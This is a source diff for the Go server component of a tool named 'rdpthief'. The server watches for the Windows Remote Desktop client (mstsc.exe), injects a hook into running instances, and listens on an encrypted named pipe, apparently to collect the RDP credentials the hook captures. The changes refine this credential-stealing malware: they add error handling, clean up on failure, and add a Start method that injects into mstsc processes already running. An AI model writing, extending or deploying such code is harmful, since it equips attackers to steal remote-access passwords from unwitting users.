@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/Microsoft/go-winio"
+	"github.com/pkg/errors"
 
 	"project/internal/convert"
 	"project/internal/crypto/aes"
@@ -49,35 +50,43 @@ type Server struct {
 
 // NewServer is used to create a rdpthief server.
 func NewServer(lg logger.Logger, inj Injector, cb Callback, cfg *Config) (*Server, error) {
-	srv := Server{
-		logger:   lg,
-		injector: inj,
-		callback: cb,
-		hook:     security.NewBytes(cfg.Hook),
-	}
 	passHash := sha256.Sum256([]byte(cfg.Password))
 	cbc, err := aes.NewCBC(passHash[:], passHash[:aes.IVSize])
 	if err != nil {
-		return nil, err
+		return nil, errors.Wrap(err, "failed to create aes cbc encryptor")
 	}
+	srv := Server{logger: lg}
 	// create process monitor
-	psmonOpts := psmon.Options{
+	opts := psmon.Options{
 		Interval: 250 * time.Millisecond,
 		Process:  new(process.Options), // only need process name
 	}
-	monitor, err := psmon.New(lg, srv.psmonEventHandler, &psmonOpts)
+	monitor, err := psmon.New(lg, srv.psmonEventHandler, &opts)
 	if err != nil {
-		return nil, err
+		return nil, errors.WithMessage(err, "failed to create process monitor")
 	}
+	var ok bool
+	defer func() {
+		if ok {
+			return
+		}
+		err := monitor.Close()
+		if err != nil {
+			srv.log(logger.Error, "failed to close process monitor:", err)
+		}
+	}()
 	// create pipe listener
 	listener, err := winio.ListenPipe(`\\.\pipe\`+cfg.PipeName, nil)
 	if err != nil {
-		return nil, err
+		return nil, errors.Wrap(err, "failed to listen pipe")
 	}
+	// set resource
+	srv.injector = inj
+	srv.callback = cb
+	srv.hook = security.NewBytes(cfg.Hook)
 	srv.cbc = cbc
 	srv.psmon = monitor
 	srv.listener = listener
-	// start serve
 	srv.wg.Add(1)
 	go srv.serve(listener)
 	return &srv, nil
@@ -105,6 +114,25 @@ func (srv *Server) psmonEventHandler(_ context.Context, event uint8, data interf
 	}
 }
 
+// Start is used to start rdpthief server.
+func (srv *Server) Start() error {
+	srv.psmon.Start()
+	// get old process list for inject already exists mstsc process.
+	err := srv.psmon.Refresh()
+	if err != nil {
+		return err
+	}
+	for _, ps := range srv.psmon.GetProcesses() {
+		if ps.Name != "mstsc.exe" {
+			continue
+		}
+		go func(ps *process.PsInfo) {
+			srv.injectHook(ps)
+		}(ps)
+	}
+	return nil
+}
+
 func (srv *Server) injectHook(process *process.PsInfo) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -113,13 +141,13 @@ func (srv *Server) injectHook(process *process.PsInfo) {
 	}()
 	hook := srv.hook.Get()
 	defer srv.hook.Put(hook)
-	srv.log(logger.Critical, "start inject hook to process", process.PID)
+	srv.log(logger.Info, "start inject hook to process", process.PID)
 	err := srv.injector(uint32(process.PID), hook)
 	if err != nil {
 		srv.logf(logger.Error, "failed to inject hook to process %d: %s", process.PID, err)
 		return
 	}
-	srv.logf(logger.Critical, "inject hook to process %d successfully", process.PID)
+	srv.logf(logger.Info, "inject hook to process %d successfully", process.PID)
 }
 
 func (srv *Server) serve(listener net.Listener) {
